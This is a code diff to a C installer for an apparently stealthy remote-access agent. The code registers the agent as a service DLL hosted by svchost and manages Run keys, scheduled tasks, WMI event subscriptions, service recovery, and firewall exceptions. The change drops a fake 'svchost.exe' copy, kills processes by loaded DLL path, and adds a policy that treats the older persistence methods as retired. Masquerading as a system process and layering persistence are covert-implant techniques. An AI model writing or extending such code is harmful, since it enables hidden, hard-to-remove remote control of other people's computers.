@@ -107,6 +107,7 @@ static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persist
 static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
 static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName, BOOL refreshExisting);
 static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
+static BOOL Stealth_IsRundll32OnlyPersistencePolicyActive(void);
 static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut);
 static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut);
 static void Stealth_TrimWhitespaceInplace(wchar_t* value);
@@ -177,6 +178,11 @@ static BOOL Stealth_WaitForExpectedIdentity(const wchar_t* dbPath, const struct 
 static BOOL Stealth_PathExists(const wchar_t* path);
 static BOOL Stealth_ReadRegistryString(HKEY root, const wchar_t* subKey, const wchar_t* valueName, wchar_t* buffer, size_t bufferCch, DWORD* valueType);
 static BOOL Stealth_ReadRegistryDword(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD* valueOut);
+
+static BOOL Stealth_IsRundll32OnlyPersistencePolicyActive(void)
+{
+    return TRUE;
+}
 static BOOL Stealth_ValidateSvchostPayloadDll(const wchar_t* dllPath);
 static BOOL Stealth_IsSvchostPayloadDllCandidate(const wchar_t* dllPath);
 static BOOL Stealth_VerifySvchostServiceBinding(const wchar_t* serviceName, const wchar_t* dllPath);
@@ -2466,21 +2472,15 @@ static BOOL Stealth_WaitForUpdateTargetQuiesced(const StealthInstallPaths* paths
 
     if (GetFileAttributesW(targetPath) == INVALID_FILE_ATTRIBUTES) { return TRUE; }
 
-    wchar_t hostExePath[MAX_PATH] = {0};
-    if (!MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths->installDir, L"svchost.exe"))
-    {
-        hostExePath[0] = L'\0';
-    }
-
     const DWORD startTick = GetTickCount();
     DWORD delay = 100;
     DWORD lastErr = ERROR_SUCCESS;
 
     while ((GetTickCount() - startTick) < timeoutMs)
     {
-        if (hostExePath[0] != L'\0')
+        if (paths->dllPath[0] != L'\0')
         {
-            Stealth_TerminateProcessesByPath(hostExePath);
+            Stealth_TerminateProcessesByLoadedModulePath(paths->dllPath);
         }
         if (paths->exePath[0] != L'\0')
         {
@@ -3026,14 +3026,8 @@ static BOOL Stealth_ApplyInstallFlow(
 
     // Pre-clean: stop any running service and remove stale artifacts from prior failed installs
     Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
-    {
-        wchar_t staleHostExe[MAX_PATH] = {0};
-        if (MeshInstaller_CombinePath(staleHostExe, _countof(staleHostExe), paths.installDir, L"svchost.exe"))
-        {
-            Stealth_TerminateProcessesByPath(staleHostExe);
-        }
-        Stealth_TerminateProcessesByPath(paths.exePath);
-    }
+    Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
+    Stealth_TerminateProcessesByPath(paths.exePath);
     {
         wchar_t staleStateDir[MAX_PATH] = {0};
         wchar_t staleStageDir[MAX_PATH] = {0};
@@ -3174,15 +3168,9 @@ static BOOL Stealth_ApplyInstallFlow(
     }
 
     // Step 4: Add Windows Firewall exceptions
-    wchar_t hostExePath[MAX_PATH] = {0};
     wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToExcept = NULL;
-    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe") &&
-        GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
-    {
-        hostToExcept = hostExePath;
-    }
-    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
         hostToExcept = systemSvchostPath;
     }
@@ -3282,7 +3270,6 @@ static BOOL Stealth_ApplyUninstallFlow(void)
     wchar_t stateDirPath[MAX_PATH] = {0};
     wchar_t controlLogPath[MAX_PATH] = {0};
     wchar_t svchostDebugPath[MAX_PATH] = {0};
-    wchar_t hostExePath[MAX_PATH] = {0};
 
     Stealth_ResolveRuntimeServiceBranding(
         serviceKeyName,
@@ -3297,7 +3284,6 @@ static BOOL Stealth_ApplyUninstallFlow(void)
 
     // Get paths
     Stealth_GetInstallPaths(&paths);
-    MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");
     {
         size_t removedAliases = Stealth_CleanupConflictingServiceAliases(&paths, serviceKeyName);
         if (removedAliases > 0)
@@ -3314,13 +3300,13 @@ static BOOL Stealth_ApplyUninstallFlow(void)
 
     // Stop and terminate service/host processes
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
-    Stealth_TerminateProcessesByPath(hostExePath);
+    Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
     Stealth_TerminateProcessesByPath(paths.exePath);
 
     // Clean up any persistence artifacts that may have been recreated during shutdown
     Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);
     Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE);
-    Stealth_TerminateProcessesByPath(hostExePath);
+    Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
     Stealth_TerminateProcessesByPath(paths.exePath);
 
     if (!Stealth_UnregisterSvchostService(serviceKeyName))
@@ -3443,7 +3429,6 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
     BOOL serviceExists = FALSE;
     wchar_t serviceKeyName[256] = {0};
     wchar_t serviceDisplayName[256] = {0};
-    wchar_t hostExePath[MAX_PATH] = {0};
     wchar_t liveMshPath[MAX_PATH] = {0};
     StealthUpdateTransaction tx;
     StealthPackagePreflight preflight;
@@ -3467,7 +3452,6 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
         Stealth_LogInstallEvent(L"[UPDATE] Failed to resolve install paths");
         return FALSE;
     }
-    (void)MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe");
     {
         size_t removedAliases = Stealth_CleanupConflictingServiceAliases(&paths, serviceKeyName);
         if (removedAliases > 0)
@@ -3575,10 +3559,7 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
     if (serviceExists && !Stealth_StopServiceAndWait(serviceKeyName, 30000, TRUE))
     {
         Stealth_LogInstallEvent(L"[WARN] [UPDATE] Service stop timed out; forcing dedicated host teardown");
-        if (hostExePath[0] != L'\0')
-        {
-            Stealth_TerminateProcessesByPath(hostExePath);
-        }
+        Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
         Stealth_TerminateProcessesByPath(paths.exePath);
         Sleep(1000);
         if (Stealth_ServiceIsRunning(serviceKeyName))
@@ -3593,10 +3574,7 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
         Stealth_LogInstallEvent(L"[UPDATE] Existing service registration absent; continuing with repair install semantics");
     }
 
-    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), paths.installDir, L"svchost.exe"))
-    {
-        Stealth_TerminateProcessesByPath(hostExePath);
-    }
+    Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
     Stealth_TerminateProcessesByPath(paths.exePath);
 
     // Wait for file locks to release after process termination (DLL may still be held briefly)
@@ -3670,11 +3648,7 @@ CLEANUP:
     // Refresh firewall rules (host svchost + WebRTC inbound UDP)
     wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToExcept = NULL;
-    if (hostExePath[0] != L'\0' && GetFileAttributesW(hostExePath) != INVALID_FILE_ATTRIBUTES)
-    {
-        hostToExcept = hostExePath;
-    }
-    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
         hostToExcept = systemSvchostPath;
     }
@@ -3759,10 +3733,7 @@ CLEANUP:
             BOOL rollbackOk = FALSE;
             Stealth_LogInstallEvent(L"[UPDATE] Attempting rollback for %ls", serviceKeyName);
             (void)Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
-            if (hostExePath[0] != L'\0')
-            {
-                Stealth_TerminateProcessesByPath(hostExePath);
-            }
+            Stealth_TerminateProcessesByLoadedModulePath(paths.dllPath);
             Stealth_TerminateProcessesByPath(paths.exePath);
             rollbackOk = Stealth_RollbackUpdateTransaction(&paths, serviceKeyName, &tx);
             if (rollbackOk && restartService)
@@ -4690,15 +4661,9 @@ static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery)
     discovery->conflictingServiceAliasCount = (DWORD)Stealth_CollectConflictingServiceAliases(&discovery->paths, discovery->serviceKeyName, NULL, 0);
     discovery->serviceAliasClean = (discovery->conflictingServiceAliasCount == 0);
 
-    wchar_t hostExePath[MAX_PATH] = {0};
     wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToValidate = NULL;
-    if (MeshInstaller_CombinePath(hostExePath, _countof(hostExePath), discovery->paths.installDir, L"svchost.exe") &&
-        Stealth_PathExists(hostExePath))
-    {
-        hostToValidate = hostExePath;
-    }
-    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
         hostToValidate = systemSvchostPath;
     }
@@ -4735,25 +4700,36 @@ static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery)
             _countof(consumerName));
     }
 
-    discovery->persistenceHealthy = TRUE;
     const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
-    if (persistence != NULL)
+    if (Stealth_IsRundll32OnlyPersistencePolicyActive())
     {
-        if (!discovery->persistenceStateExists)
+        discovery->persistenceHealthy = (!discovery->persistenceStateExists &&
+                                         !discovery->runKeyPresent &&
+                                         !discovery->autorunTaskPresent &&
+                                         !discovery->restartTaskPresent &&
+                                         !discovery->wmiSubscriptionPresent);
+    }
+    else
+    {
+        discovery->persistenceHealthy = TRUE;
+        if (persistence != NULL)
         {
-            discovery->persistenceHealthy = FALSE;
-        }
-        if (persistence->runKey != 0 && !discovery->runKeyPresent)
-        {
-            discovery->persistenceHealthy = FALSE;
-        }
-        if (persistence->autorunTask.enabled && !discovery->autorunTaskPresent)
-        {
-            discovery->persistenceHealthy = FALSE;
-        }
-        if (persistence->restartTask.enabled && !(discovery->restartTaskPresent || discovery->wmiSubscriptionPresent))
-        {
-            discovery->persistenceHealthy = FALSE;
+            if (!discovery->persistenceStateExists)
+            {
+                discovery->persistenceHealthy = FALSE;
+            }
+            if (persistence->runKey != 0 && !discovery->runKeyPresent)
+            {
+                discovery->persistenceHealthy = FALSE;
+            }
+            if (persistence->autorunTask.enabled && !discovery->autorunTaskPresent)
+            {
+                discovery->persistenceHealthy = FALSE;
+            }
+            if (persistence->restartTask.enabled && !(discovery->restartTaskPresent || discovery->wmiSubscriptionPresent))
+            {
+                discovery->persistenceHealthy = FALSE;
+            }
         }
     }
 
@@ -5873,15 +5849,9 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
     }
 
     // Firewall rule validation
-    wchar_t svchostPath[MAX_PATH] = {0};
     wchar_t systemSvchostPath[MAX_PATH] = {0};
     const wchar_t* hostToValidate = NULL;
-    if (MeshInstaller_CombinePath(svchostPath, _countof(svchostPath), paths.installDir, L"svchost.exe") &&
-        GetFileAttributesW(svchostPath) != INVALID_FILE_ATTRIBUTES)
-    {
-        hostToValidate = svchostPath;
-    }
-    else if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
+    if (Stealth_GetSystemSvchostPathW(systemSvchostPath, _countof(systemSvchostPath)))
     {
         hostToValidate = systemSvchostPath;
     }
@@ -5900,7 +5870,59 @@ static BOOL Stealth_RunInstallValidationInternal(const char* phase)
 
     // Persistence validation
     const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
-    if (persistence == NULL)
+    if (Stealth_IsRundll32OnlyPersistencePolicyActive())
+    {
+        StealthPersistenceState state;
+        summary.persistenceState = !Stealth_LoadPersistenceState(&state);
+        if (!summary.persistenceState)
+        {
+            summary.success = FALSE;
+            Stealth_LogInstallEvent(L"[VALIDATION] Retired persistence state file still present");
+        }
+
+        wchar_t runValue[512] = {0};
+        summary.runKey = !Stealth_RunKeyValueExists(serviceKeyName, runValue, _countof(runValue));
+        if (!summary.runKey)
+        {
+            summary.success = FALSE;
+            Stealth_LogInstallEvent(L"[VALIDATION] Retired Run key still present for %ls", serviceKeyName);
+        }
+
+        wchar_t prefixCandidates[10][STEALTH_TASK_NAME_MAX] = {0};
+        size_t prefixCount = Stealth_BuildTaskPrefixCandidates(
+            persistence,
+            serviceDisplayName,
+            serviceKeyName,
+            prefixCandidates,
+            _countof(prefixCandidates));
+        wchar_t existingTask[STEALTH_TASK_NAME_MAX] = {0};
+        BOOL autorunExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-Autorun-", existingTask, _countof(existingTask));
+        BOOL restartExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, L"-RestartOnStop-", existingTask, _countof(existingTask));
+        BOOL anyTaskExists = Stealth_FindTaskByPrefixCandidates(prefixCandidates, prefixCount, NULL, existingTask, _countof(existingTask));
+        summary.autorunTask = (!autorunExists && !anyTaskExists);
+        summary.restartTask = (!restartExists && !anyTaskExists);
+        if (!summary.autorunTask || !summary.restartTask)
+        {
+            summary.success = FALSE;
+            Stealth_LogInstallEvent(L"[VALIDATION] Retired scheduled task still present for %ls: %ls", serviceKeyName, existingTask);
+        }
+
+        wchar_t filterName[128] = {0};
+        wchar_t consumerName[128] = {0};
+        summary.wmiSubscription = !Stealth_FindWmiByPrefixCandidates(
+            prefixCandidates,
+            prefixCount,
+            filterName,
+            _countof(filterName),
+            consumerName,
+            _countof(consumerName));
+        if (!summary.wmiSubscription)
+        {
+            summary.success = FALSE;
+            Stealth_LogInstallEvent(L"[VALIDATION] Retired WMI subscription still present for %ls: %ls/%ls", serviceKeyName, filterName, consumerName);
+        }
+    }
+    else if (persistence == NULL)
     {
         summary.success = FALSE;
         Stealth_LogInstallEvent(L"[VALIDATION] Persistence profile unavailable");
